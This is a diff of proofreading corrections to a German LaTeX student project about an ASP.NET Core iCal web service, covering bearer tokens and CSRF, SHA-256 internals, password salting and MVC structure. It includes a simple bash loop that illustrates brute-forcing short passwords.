-Wenn ein Benutzer authentifiziert ist, wird ihm ein Token ausgestellt. Dieser Token enthält Benutzerinformationen oder ein Referenztoken, welcher auf den verwalteten Benutzerstatus verweist. Wenn ein Benutzer versucht, auf eine Ressource zuzugreifen, die eine Authentifizierung erfordert, wird dieser Token mit einem zusätzlichen Header in Form eines Bearer-Token an die Anwendung gesendet. Dies macht die Anwendung zustandslos. In jeder nachfolgenden Request wird dieser Token in der Anforderung zur serverseitigen Überprüfung übergeben. Dieser Token wird nicht Kryptografisch verschlüsselt sondern enkodiert. Auf dem Server wird dieser Token dann dekodiert, um auf seine Informationen zugreifen zu können. Dieser Token wird lokal im Browser gespeichet, dadurch ist CSRF keine Gefahr mehr, da der Token nicht als Cookie gesetzt wurde.
+Wenn ein Benutzer authentifiziert ist, wird ihm ein Token ausgestellt. Dieser Token enthält Benutzerinformationen oder ein Referenztoken, welcher auf den verwalteten Benutzerstatus verweist. Wenn ein Benutzer versucht, auf eine Ressource zuzugreifen, die eine Authentifizierung erfordert, wird dieser Token mit einem zusätzlichen Header in Form eines Bearer-Token an die Anwendung gesendet. Dies macht die Anwendung zustandslos. In jeder nachfolgenden Request wird dieser Token in der Anforderung zur serverseitigen Überprüfung übergeben. Dieser Token wird nicht kryptografisch verschlüsselt sondern encodiert. Auf dem Server wird dieser Token dann decodiert, um auf seine Informationen zugreifen zu können. Dieser Token wird lokal im Browser gespeichert, dadurch ist CSRF keine Gefahr mehr, da der Token nicht als Cookie gesetzt wurde.
 \subsubsection{ASP.NET Core antiforgery Konfiguration}
 Seit ASP.NET Core 2.0 wird automatisch in jedem Form-Feld im Hintergrund ein Antiforgery Token.
 \begin{lstlisting}
@@ -363,32 +360,31 @@ vgl. \textcite{CSRF-Protection}
 %https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.2
 \section{Hashes}
 \label{hash-expl}
-Die Erklärung von Hashes wird mit einem Beispiel begonnen.
-\\Ziel ist es ein File von einem Computer zu einem anderen Computer schicken und es ist sehr wichtig das dabei fesgestellt werden kann, dass es sich nicht verändert hat. Um das zu gewährleisten, gibt es Hash Algorithmen. Ein Hash ist eine Einwegfunktion, heißt es ist möglich einen Hash für ein File zu berechnen aber nicht aus dem Hash ein File zu berechnen.\\
+Die Erklärung von Hashes wird mit einem Beispiel begonnen.\\Ziel ist es ein File von einem Computer zu einem anderen Computer zu schicken und es ist dabei festzustellen, dass es sich nicht verändert hat. Um das zu gewährleisten, gibt es Hash Algorithmen. Ein Hash ist eine Einwegfunktion, heißt es ist möglich einen Hash für ein File zu berechnen aber nicht aus dem Hash ein File zu berechnen.\\
 Drei Sachen sind bei einem Hash Algorithmus wichtig.
 \begin{enumerate}
 \item Geschwindigkeit
 \item Ändert sich 1-bit sollte der gesamte Hash anders sein
-\item Hash Kollisionen verhindern 
+\item Hash Kollisionen müssen verhindert werden
 \end{enumerate}
 \subsection{Hash Kollisionen}
 \label{sec:hash_coll}
-Ein wichtiges Dokument, welches der Leitung in der IT geschickt wird soll unverändert übertragen werden. Mit dem Dokument kommt der Hash damit die IT verifizieren kann das jenes Dokument auch das richtige ist. Ist es jetzt dem Angreifer möglich das File zu bekommen und zu verändern, würde der Hash ein anderer sein. Ist der Hash algorithmus aber nicht richtig implementiert und somit nicht funktionsfähig ist, es möglich für das File den originalen Hash festzulegen.
+Ein wichtiges Dokument, welches der Leitung in der IT geschickt wird, soll unverändert übertragen werden. Mit dem Dokument kommt der Hash , damit die IT verifizieren kann, dass jenes Dokument auch das richtige ist. Ist es jetzt dem Angreifer möglich das File zu bekommen und zu verändern, würde der Hash ein anderer sein. Ist der Hash Algorithmus aber nicht richtig implementiert und somit nicht funktionsfähig ist, es möglich für das File den originalen Hash festzulegen.
 \\
 Beispiele
 \begin{enumerate}
 \item MD5
 \item SHA1
 \end{enumerate}
-Der Faktor Schnelligkeit ist sehr relevant, ist der Algorithmus zu langsam will ihn keiner nutzen, ist er aber zu schnell ist es recht einfach ein Dokument zu erstellen welches zwar anders ist aber den selben Hash als das Orginal hat.
+Der Faktor Schnelligkeit ist sehr relevant, ist der Algorithmus zu langsam will ihn keiner nutzen, ist er aber zu schnell, ist es recht einfach ein Dokument zu erstellen, welches zwar anders ist aber denselben Hash, als das Orginal hat.
 \section{Wie funktioniert ein Hash Algorithmus}
 \label{sec:hash_algo}
-Wie ein Hash Algorithmus grundsätzlich arbeitet werde ich anhand von SHA-256 erklären. 
+Wie ein Hash Algorithmus grundsätzlich arbeitet wird anhand von SHA-256 erklärt werden. 
 \subsection{Allgemeines über SHA256}
 \label{sec:hash_sha}
-SHA256(secure hash algorithm) ist ein kryptografischer Hash mit eine Zeichenlänge von 256 Bits. Es ist eine schlüssellose Hash-Funktion.
+SHA256(secure hash algorithm) ist ein kryptografischer Hash mit einer Zeichenlänge von 256 Bits. Es ist eine schlüssellose Hash-Funktion.
 \\
-Eine Nachricht wird in jeweils 512 Bitblöcken (16 * 32 Bits) abgearbeitet und jeder block benötigt 64 Runden.
+Eine Nachricht wird in jeweils 512 Bitblöcken (16 * 32 Bits) abgearbeitet und jeder Block benötigt 64 Runden.
 \subsection{Der Algorithmus}
 \label{sec:hash_sha_alg}
 Basis Operationen
@@ -402,7 +398,7 @@ Basis Operationen
 \item Bitweises Komplement
 \item Integer-Addition Modulo $2^{32}$, bezeichnet mit A + B.
 \end{enumerate}
-Jede dieser Operationen arbeitet mit 32 Bit. Bei der letzten Operation wird diese von Binär in Integer übersetzt und in Dezimal Basis geschrieben.\\
+Jede dieser Operationen arbeitet mit 32 Bit. Bei der letzten Operation wird der Input von Binär in Integer übersetzt und in Dezimal Basis geschrieben.\\
 Wobei
 \begin{enumerate}
 \item RotR (A, n) bezeichnet die zirkulare Verschiebung von n Bits des Binärworts A nach rechts
@@ -419,20 +415,18 @@ Maj(X,Y,Z) = (X\wedge Y) \bigoplus (X\wedge Z) \bigoplus (Y\wedge Z)\\
 $
 \subsubsection{Das Padding}
 \label{sec:hash_padd}
-Das Padding stellt sicher, dass die Nachricht ein Vielfaches von 512 Bits ist dafür wird folgendes getan.
+Das Padding stellt sicher, dass die Nachricht ein Vielfaches von 512 Bits ist. Dafür wird folgendes getan.
 \begin{enumerate}
 \item Zuerst wird ein Bit 1 angehängt,
-\item Als nächstes werden k Bits 0 angehängt, wobei k die kleinste positive ganze Zahl ist, so dass l + 1 + k $<=$ 448 ist
-mod 512, wobei l die Länge der ursprünglichen Nachricht in Bits ist
-\item Schließlich wird die Länge l < $2^{64}$ der ursprünglichen Nachricht mit genau 64 Bits und diesen Bits dargestellt
-werden am Ende der Nachricht hinzugefügt
+\item Als nächstes werden k Bits 0 angehängt, wobei k die kleinste positive ganze Zahl ist, so dass l + 1 + k $<=$ 448 mod 512, wobei l die Länge der ursprünglichen Nachricht in Bits ist
+\item Schließlich wird die Länge l $<$ $2^{64}$ der ursprünglichen Nachricht mit genau 64 Bits und diese werden am Ende der Nachricht hinzugefügt
 \end{enumerate}
 Die Nachricht wird immer aufgefüllt, auch wenn die Anfangslänge bereits ein Vielfaches von 512 ist.
 \subsubsection{Block decomposition}
 \label{sec:hash_block_deco}
 Für jeden Block M $\in$ $(0, 1)^{512}$ , 64 Wörter aus 32 Bits wird folgendermaßem vorgegangen. 
 \begin{enumerate}
-\item Die ersten 16 werden durch Aufteilen von M in 32-Bit-Blöcke erhalten
+\item Die ersten 16 werden durch aufteilen von M in 32-Bit-Blöcke erhalten
 \item Die restlichen 48 werden durch folgende Formel erhalten.
 \end{enumerate}
 Formel 1:
@@ -450,18 +444,18 @@ Als nächstes werden die Blöcke $M^{(1)}$ $M^{(2)}$ $M^{(3)}$ gleichzeitig abge
 \item Erzeugen von 64 Blöcken $W_i$ von $M^{(t)}$
 \item setzen von \\(a,b,c,d,e,f,g,h) = ($H_1^{(t-1)}$,$H_2^{(t-1)}$,$H_3^{(t-1)}$,$H_4^{(t-1)}$,$H_5^{(t-1)}$,$H_6^{(t-1)}$,$H_7^{(t-1)}$,$H_8^{(t-1)}$)
 \item 64 Runden ausführen von\\$T_1 = h + {\sum_1} (e) + Ch(e, f, g) + K_i + W_i\\T_2 = \sum_0(a) + Maj(a,b,c)\\h = g\\g=f\\f=e\\e=d+ T_1\\d=c\\c=b\\b=a\\a=T_1+T_2$
-\item Berechnen des neuen wertes von $H_j^{(t)}$\\$H_1^{(t)}  = H_1^{(t-1)} + a \\H_2^{(t)}  = H_2^{(t-1)} + b \\H_3^{(t)}  = H_3^{(t-1)} + c \\H_1^{(t)}  = H_4^{(t-1)} + d \\H_5^{(t)}  = H_5^{(t-1)} + e \\H_6^{(t)}  = H_6^{(t-1)} + f \\H_7^{(t)}  = H_7^{(t-1)} + g \\H_8^{(t)}  = H_8^{(t-1)} + h$
+\item Berechnen des neuen Wertes von $H_j^{(t)}$\\$H_1^{(t)}  = H_1^{(t-1)} + a \\H_2^{(t)}  = H_2^{(t-1)} + b \\H_3^{(t)}  = H_3^{(t-1)} + c \\H_1^{(t)}  = H_4^{(t-1)} + d \\H_5^{(t)}  = H_5^{(t-1)} + e \\H_6^{(t)}  = H_6^{(t-1)} + f \\H_7^{(t)}  = H_7^{(t-1)} + g \\H_8^{(t)}  = H_8^{(t-1)} + h$
 \item Ende
 \end{enumerate}
-Der Hash Value ist das Ergebnis wenn alle $H_i^N$, nach durchgang des letzten Blocks, zusammengfügt werden.\\$H = H_1^{(N)} || H_2^{(N)} || H_3^{(N)} || H_4^{(N)} || H_5^{(N)} || H_6^{(N)} || H_7^{(N)} || H_8^{(N)}$\\ \\
+Der Hash Value ist das Ergebnis wenn alle $H_i^N$, nach Durchgang des letzten Blocks, zusammengefügt werden.\\$H = H_1^{(N)} || H_2^{(N)} || H_3^{(N)} || H_4^{(N)} || H_5^{(N)} || H_6^{(N)} || H_7^{(N)} || H_8^{(N)}$\\ \\
 input: 61 62 63 \\
 hash: ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad\\
 vgl. \textcite{sha256}
 \subsection{Passwort Hashes}
 \label{sec:pwdhash}
-Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner Benutzer richtig hasht.\\ \\Bereits behandelt wurde was ein Hash ist und wie ein Hash Alogrithmus funktioniert nun wird in diesm Abschnitt erklärt wie Hashfunktionen richtig genutzt werden. Wichtig bei der Speicherung des Passwortes ist die Verwendung eines Salt. Was ein Salt ist wird im Kapitel Webseite-MVC Salt erklärt.
+Wie die Wahl eines sicheren Passsworts vom Benutzer, ist es genau so wichtig für den Service Provider, dass dieser das Passwort seiner Benutzer richtig hasht.\\ \\Bereits behandelt wurde, was ein Hash ist und wie ein Hash Algorithmus funktioniert nun wird in diesem Abschnitt erklärt, wie Hashfunktionen richtig genutzt werden. Wichtig bei der Speicherung des Passwortes ist die Verwendung eines Salt. Was ein Salt ist, wird im Kapitel Webseite-MVC Salt erklärt
 \subsection{Richtige Speicherung von Benutzerdaten}
-Der erstellte Salt für ein Passwort muss für jeden Benutzer eindeutig sein. Jedes Mal, wenn ein Benutzer ein Konto erstellt oder sein Kennwort ändert, sollte das Kennwort mit einem neuen zufälligen Salt gehasht werden. Es sollte niemals ein Salt wiederverwendet werden. Der Salt sollte auch einigermaßen lang sein damit es Möglich ist viele verschiedene Salt Werte zu erzeugen. Als Faustregel gilt, dass der Salt mindestens so lang sein sollte, wie die Länge des Hashes der von der Hash-Funktion erzeugt wird. Der Salt sollte in dem Benutzertable der Datenbank neben dem Hash gespeichert werden.
+Der erstellte Salt für ein Passwort muss für jeden Benutzer eindeutig sein. Jedes Mal, wenn ein Benutzer ein Konto erstellt oder sein Kennwort ändert, sollte das Kennwort mit einem neuen zufälligen Salt gehasht werden. Es sollte niemals ein Salt wiederverwendet werden. Der Salt sollte auch einigermaßen lang sein, damit es möglich ist, viele verschiedene Saltwerte zu erzeugen. Als Faustregel gilt, dass der Salt mindestens so lang sein sollte, wie die Länge des Hashes der von der Hash-Funktion erzeugt wird. Der Salt sollte in der Benutzertabelle der Datenbank neben dem Hash gespeichert werden.
 \paragraph{Speichern eines Passworts}:\\
 \begin{enumerate}
 \item Erzeugen eines langen zufälligen Salt mit einem CSPRNG.(Kryptographisch sicherer Zufallszahlengenerator) 
@@ -480,11 +474,11 @@ Der erstellte Salt für ein Passwort muss für jeden Benutzer eindeutig sein. Je
 \label{sec:MVC}
 \section{Allgemeines MVC}
 \label{sec:allgemein}
-In diesem Abschnitt dreht sich um ASP .NET MVC womit die Webseite des ICAL-Webservices geschrieben wurde. Hier wird die Grundidention von MVC und was MVC ist besprochen. Wie die Webseite aufgebaut wurde werden wird anhand von Code Auszügen gezeigt. Die beim MVC bekannten Views Controllers und Services werden aufgezeigt und erklärt. Ebenfalls wird behandelt, wie die Links zu den Kalendern erzeugt und zur Verfügung gestellt werden. 
+Dieser Abschnitt dreht sich um ASP .NET MVC womit die Webseite des ICAL-Webservices geschrieben wurde. Hier wird die Grundidention von MVC und was MVC ist besprochen. Wie die Webseite aufgebaut wurde, wird anhand von Code Auszügen gezeigt. Die beim MVC bekannten Views und Controllers werden aufgezeigt und erklärt. Ebenfalls wird behandelt, wie die Links zu den Kalendern erzeugt und zur Verfügung gestellt werden. 
 \section{Erstellung der Webseite}
 \label{sec:erstellung_ws}
-Dieses Kapitel befässt sich damit wie in Visual-Studio ein MVC-Website Projekt erstellen werden kann.\\
-Zunächst muss sichergestellt werden, dass alle benötigten Features installiert sind. Dafür geht muss auf Datei -\textgreater{} Neues Projekt geklickt werden und dann noch auf folgendes.\\
+Dieses Kapitel befässt sich damit wie in Visual-Studio ein MVC-Website Projekt erstellt werden kann.\\
+Zunächst muss sichergestellt werden, dass alle benötigten Features installiert sind. Dafür muss auf Datei -\textgreater{} Neues Projekt geklickt werden und dann auf folgendes.\\
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_features}
     \caption{Webseite Features}
@@ -505,14 +499,14 @@ Zuerst muss die Erstellung eines neuen Projektes über File -\textgreater{} New 
     \label{fig:weberstell1}
 \end{figure}
 Schritt 2:\\
-Danach muss unter dem Tab Web die ASP.NET Core Web Application ausgewählt werden und dieser ein Name zugewiesen werden. Danach muss der Schalter Ok gedrückt werden.\\
+Danach muss unter dem Tab Web die ASP.NET Core Web Application ausgewählt werden und dieser muss ein Name zugewiesen werden. Danach muss der Schalter Ok gedrückt werden.\\
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt2}
     \caption{Webseite Erstellung Schritt 2}
     \label{fig:weberstell2}
 \end{figure}
 Schritt 3:\\
-Nun muss das Modell gewählt werden, für den ICAL-Webservice benötigen wird die  MVC Web-Application. Danach muss der Schalter Change Authentication gedrückt werden. \\
+Nun muss das Modell gewählt werden, für den ICAL-Webservice wird die MVC Web-Application benötigt. Danach muss der Schalter Change Authentication gedrückt werden. \\
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Schritt3}
     \caption{Webseite Erstellung Schritt 3}
@@ -524,7 +518,7 @@ In diesem Schritt wird festgelegt, dass die Web-Anwendung Benutzerdaten speicher
     \caption{Webseite Erstellung Schritt 4}
     \label{fig:weberstell4}
 \end{figure}
-Danach wurde erfolgreich eine MVC-Website erstellt und diese kann über den IIS Express Lokal gestartet und getestet werden. Wird dieses Projekt nun ausgegührt ist das ASP Template zu sehen.\\
+Danach wurde erfolgreich eine MVC-Webseite erstellt und diese kann über den IIS Express Lokal gestartet und getestet werden. Wird dieses Projekt nun ausgegührt ist das ASP Template zu sehen.\\
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Erstellung_Done}
     \caption{Webseite Erstellung Fertig}
@@ -555,7 +549,7 @@ Auf dieser kann sich dann entweder eingeloggt oder registriert werden.\\
     \caption{Webseite Loginseite}
     \label{fig:weblogin}
 \end{figure}
-Wird das Passwort einmal vergessen, kann dieses über das Passwort vergessen Feature zurückgesetzt werden. 
+Wird das Passwort einmal vergessen, kann dieses Passwort über das Passwort vergessen Feature, zurückgesetzt werden. 
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_PasswordReset}
     \caption{Webseite Passwort Zurücksetzen}
@@ -578,7 +572,7 @@ Man kann sein Passwort ändern oder sein 2FA einrichten. \\
     \caption{Webseite Benutzer 2FA}
     \label{fig:webuser2fa}
 \end{figure}
-Und natürlich gibt es hier das Hauptfeature, nämlich das verwalten der Kalender, bzw. das Abrufen der Links oder das direkt herunterladen.\\
+Und natürlich gibt es hier das Hauptfeature, nämlich das verwalten der Kalender, bzw. das Abrufen der Links oder das direkte herunterladen.\\
 \begin{figure}[H]
     \includegraphics[width=\textwidth]{Webseite_MVC_Aufbau_calendars}
     \caption{Webseite Benutzer Kalender}
@@ -586,7 +580,7 @@ Und natürlich gibt es hier das Hauptfeature, nämlich das verwalten der Kalende
 \end{figure}
 \section{Link generation}
 \label{sec:link}
-Hier wird das Herz des ICAL-Webservices erklärt. Nämlich die Funktion die der/die fertigen Kalender zur Verfügung stellt.
+Hier wird das Herz des ICAL-Webservices erklärt. Nämlich die Funktion, die die fertigen Kalender zur Verfügung stellt.
 \begin{lstlisting}
 public List<string> getUsersTables(string myuser)
 {
@@ -624,9 +618,9 @@ public List<string> getUsersTables(string myuser)
 Bei dem benutztem SQL Statement wäre es möglich anzunehmen, dass eine SQL-Injection möglich wäre, dies ist aber nicht der Fall, da hier der übergebene String nicht von der Eingabe des Users abhängt, sondern fix im Programm gesetzt ist.
 \section{Controller}
 \label{sec:Controller}
-MVC-Controller sind dafür verantwortlich, auf Anfragen zu reagieren, die an eine ASP.NET MVC-Website gesendet werden. Jede Anforderung wird dazu einem bestimmten Controller zugeordnet. Wird beispielsweise folgende URL von unserem ICAL-Webservice in die Adressleiste eines Webbrowsers eingegeben:\\
+MVC-Controller sind dafür verantwortlich, auf Anfragen zu reagieren, die an eine ASP.NET MVC-Webseite gesendet werden. Jede Anforderung wird dazu einem bestimmten Controller zugeordnet. Wird beispielsweise folgende URL von unserem ICAL-Webservice in die Adressleiste eines Webbrowsers eingegeben:\\
 \url{http://localhost:50699/api/iCal/1} \\
-Ruft diese einen Kontroller mit dem Namen iCalController auf. Dieser iCalController ist dafür zuständig im Hintergrund sich den ICAL-Kalender mit der jeweiligen ID zu holen und eine HTTP-Response zu liefern.\\ Hier folgt dessen Implementierung. 
+ruft diese einen Kontroller mit dem Namen iCalController auf. Dieser iCalController ist dafür zuständig sich im Hintergrund den ICAL-Kalender mit der jeweiligen ID zu holen und eine HTTP-Response zu liefern.\\ Hier folgt dessen Implementierung. 
 \begin{lstlisting}
 using iCalWebService.BL;
 using Microsoft.AspNetCore.Mvc;
@@ -640,7 +634,7 @@ public string Get(int id)
 Anhand dieses Code Beispiels kann erkannt werden, dass ein Controller nur eine einfache Klasse ist. 
 \subsection{Controller Actions}
 \label{sec:controller_actions}
-Kontroller Actions sind öffentliche Methoden die aufgerufen werden wenn ein Kontroller mit einer spezifischen URL aufgerufen wird.Hier muss darauf geachtet werden, dass jede dieser öffentlichen Methoden von jedem über die richtige URL aufgerufen werden kann und deshalb hier sehr darauf geachtet werden muss was hier aufgerufen werden kann. 
+Kontroller Actions sind öffentliche Methoden, die aufgerufen werden, wenn ein Kontroller mit einer spezifischen URL aufgerufen wird.Hier muss darauf geachtet werden, dass jede dieser öffentlichen Methoden von jedem über die richtige URL aufgerufen werden kann und deshalb hier sehr darauf geachtet werden muss, was hier aufgerufen werden kann. 
 \subsection{Action Results}
 \label{sec:controller_actions_results}
 Eine Controller-Aktion gibt ein sogenanntes Aktionsergebnis zurück. Ein Aktionsergebnis ist das, was eine Controller-Aktion als Antwort auf eine Browseranforderung zurückgibt.\\Das MVC-Framework von ASP.NET unterstützt verschiedene Arten von Aktionsergebnissen, darunter:
@@ -659,8 +653,8 @@ Alle diese Resultate kommen von der Basis Klasse ActionResult.
 \\ vgl. \textcite{mic_controller}
 \subsection{Views}
 \label{sec:Views}
-Anders als in ASP.NET oder Active Server Pages enthält ASP.NET MVC nichts, was direkt einer HTML-Seite entspricht. In einer ASP.NET MVC-Anwendung befindet sich keine HTML-Seite auf der Festplatte gespeichert, die dem Pfad in der URL entspricht, welcher in die Adressleiste des Browsers eingegebem wird. Die Seite, die einer HTML-Seite in einer ASP.NET-MVC-Anwendung am nächsten kommt, wird als View bezeichnet.\\
-In einer ASP.NET-MVC-Anwendung werden eingehende Browser Requests Controller Methoden zugeordnet. Eine Controller-Methode kann einen View zurückgeben. Eine Controller-Methode führt jedoch möglicherweise eine andere Methode aus, z. B. das weiterleiten zu einer anderen Controller-Methode.
+Anders als in ASP.NET oder Active Server Pages enthält ASP.NET MVC nichts, was direkt einer HTML-Seite entspricht. In einer ASP.NET MVC-Anwendung befindet sich keine HTML-Seite, die auf der Festplatte gespeichert ist und dem Pfad in der URL entspricht, welcher in die Adressleiste des Browsers eingegebem wird. Die Seite, die einer HTML-Seite in einer ASP.NET-MVC-Anwendung am nächsten kommt, wird als View bezeichnet.\\
+In einer ASP.NET-MVC-Anwendung werden eingehende Browser Requests Controller Methoden zugeordnet. Eine Controllermethode kann einen View zurückgeben. Eine Controllermethode führt jedoch möglicherweise eine andere Methode aus, z. B. das weiterleiten zu einer anderen Controllermethode.
 \subsection{Beispiel einer View}
 \label{mvc_view_beispiel}
 Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
@@ -673,9 +667,9 @@ Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
 <h2>@ViewData["Title"]</h2>
 <div class="row">
     <div class="col-md-4">
-    /*Hier definiern wir die Form fuer das Registern eines Benutzers
-    Dafuer brauchen einige Labels und Input Controls. 
-    Das ganze ist noch in einer form die bei einem HTTP POST die Daten weitergibt */
+    /*Hier definiern wir die Form fuer das Registern eines Benutzers.
+    Dafuer brauchen wir einige Labels und Input Controlls. 
+    Das ganze ist noch in einem Form-Tag, die bei einem HTTP POST die Daten weitersendet */
         <form asp-route-returnUrl="@ViewData["ReturnUrl"]" method="post">
             <h4>Create a new account.</h4>
             <hr />
@@ -704,16 +698,15 @@ Als Beispiel folgt hier die cshtml des Registrierens auf der Webseite.
     @await Html.PartialAsync("_ValidationScriptsPartial")
 }
 \end{lstlisting}
-(erklären)
-\\ vgl. \textcite{mic_views}
+vgl. \textcite{mic_views}
 \section{Benutzer Datenbank}
 \label{sec:UserDB}
 Ein wichtiger Bereich der UserDB ist der Salt,also wird dieses Thema zuerst besprochen.
 \subsection{Salt}
 \label{sec:salt}
-Salt kommt aus der Kryptographie und ist eine zufällige Zeichenfolge, die an einen Klartext (bspw. an ein Passwort eines Users) angehängt wird, bevor dieser einer Hashfunktion übergeben wird und in einen Hash umgewandelt. Dies wird gemacht um die Entropie der Eingabe zu erhöhen. Ein Salt wird oft für die Speicherung von Passwörtern in Datenbanken genutzt. Wird ein Passwort überprüft wird dabei aber nicht jedesmal ein neuer Salt generiert, da sich ja sonst der entstandene Hashwert von dem gespeichertem Hashwert unterscheiden würde und somit das Passwort als Falsch erkannt werden würde. Deswegen wird bei der Speicherung des Passworts in der Datenbank der dafür generierte Salt-Wert auch abgespeichert.
+Salt kommt aus der Kryptografie und ist eine zufällige Zeichenfolge, die an einen Klartext (bspw. an ein Passwort eines Users) angehängt wird, bevor dieser einer Hashfunktion übergeben wird und in einen Hash umgewandelt. Dies wird gemacht, um die Entropie der Eingabe zu erhöhen. Ein Salt wird oft für die Speicherung von Passwörtern in Datenbanken genutzt. Wird ein Passwort überprüft, wird dabei aber nicht jedes Mal ein neuer Salt generiert, da sich ja sonst der entstandene Hashwert, von dem gespeichertem Hashwert unterscheiden würde und somit das Passwort als falsch erkannt werden würde. Deswegen wird bei der Speicherung des Passworts in der Datenbank der dafür generierte Saltwert auch abgespeichert.
 \subsubsection{Warum Salt}
-Hashfunktionen wie SHA oder MD5 oder andere zum Hashen von Passwörtern entwickelte Hashfunktionen erzeugen für unterschiedliche Klartexte jeweils unterschiedliche Hash-Werte. Bei einer Hashfunktion ist es äußerst unwahrscheinlich, dass jene für zwei gleiche Klartexte zwei unterschiedliche Hashwerte erzeugt. Daraus folgt das der Hashwert eines Passworts stehts der selbe ist. Somit ist es einfach zu erkennen welche Benutzer das selbe Passwort nutzen. Benutzen viele Benutzer das selbe Passwort gibt es viele gleiche Hashwerte, wodurch es anzunehmen ist, dass hier ein eher schwaches bekannteres Passwort benutzt wird, wodurch der Angreifer dann auf BruteForce Angriffe setzen könnte. Bei Bruteforce Angriffen wird entweder eine Liste bekannter Passwörter genutzt welch Zeile für Zeile durchgegangen wird oder es werden direkt alle Möglichkeiten die es geben könnte durchprobiert.Bei einem Passwort das aus beispielsweise 2 Kleinbuchstaben besteht ist es relativ rasch möglich alle Möglichkeiten durchzutesten.\\ Code Beispiel:
+Hashfunktionen wie SHA oder MD5 oder andere zum Hashen von Passwörtern entwickelte Hashfunktionen erzeugen für unterschiedliche Klartexte jeweils unterschiedliche Hashwerte. Bei einer Hashfunktion ist es äußerst unwahrscheinlich, dass jene für zwei gleiche Klartexte zwei unterschiedliche Hashwerte erzeugt. Daraus folgt, dass der Hashwert eines Passworts stets derselbe ist. Somit ist es einfach zu erkennen, welche Benutzer dasselbe Passwort nutzen. Benutzen viele Benutzer dasselbe Passwort, gibt es viele gleiche Hashwerte, wodurch es anzunehmen ist, dass hier ein eher schwaches bekannteres Passwort benutzt wird, wodurch der Angreifer dann auf BruteForce Angriffe setzen könnte. Bei Bruteforce Angriffen wird entweder eine Liste bekannter Passwörter genutzt welche Zeile für Zeile durchgegangen wird oder es werden direkt alle Möglichkeiten, die es geben könnte, durchprobiert.Bei einem Passwort, das aus beispielsweise 2 Kleinbuchstaben besteht, ist es relativ rasch möglich, alle Möglichkeiten durchzutesten.\\ Code Beispiel:
 \begin{lstlisting} 
 for i in {a..z}; do for j in {a..z}; do echo $i$j;done;done 
 \end{lstlisting}
@@ -725,7 +718,7 @@ ad\\
 ae\\
 af\\
 ..\\
-Durch beifügen des Salt ist der Hashwert für gleiche Passwörter anders und somit ist es nicht direkt ersichtlich wie viele Benutzer das gleiche Passwort nutzen. Dadurch kann ein Angreifer auch beim Einblick in die Datenbank nicht annehmen, dass einfache Passwörter genutzt werden, da er nicht abschätzen wie viel gleiche Passwörter es in der Datenbank gibt.
+Durch Beifügen des Salt ist der Hashwert für gleiche Passwörter anders und somit ist es nicht direkt ersichtlich, wie viele Benutzer das gleiche Passwort nutzen. Dadurch kann ein Angreifer auch beim Einblick in die Datenbank nicht annehmen, dass einfache Passwörter genutzt werden, da er nicht abschätzen kann, wie viel gleiche Passwörter es in der Datenbank gibt.
 \subsubsection{Die Benutzerdatenbank}
 Zu behandeln ist hier die Benutzertabelle. Welche folgendermaßen erstellt wurde.
 \begin{lstlisting}
@@ -758,5 +751,5 @@ GO
 CREATE UNIQUE NONCLUSTERED INDEX [UserNameIndex]
     ON [dbo].[AspNetUsers]([NormalizedUserName] ASC);
 \end{lstlisting}
-In diesem Bild ist ersichtlich welche Daten alle in der Benutzertabelle verwaltet und gespeichert werden.
+In diesem Bild ist ersichtlich welche Daten in der Benutzertabelle verwaltet und gespeichert werden.
 \pagebreak
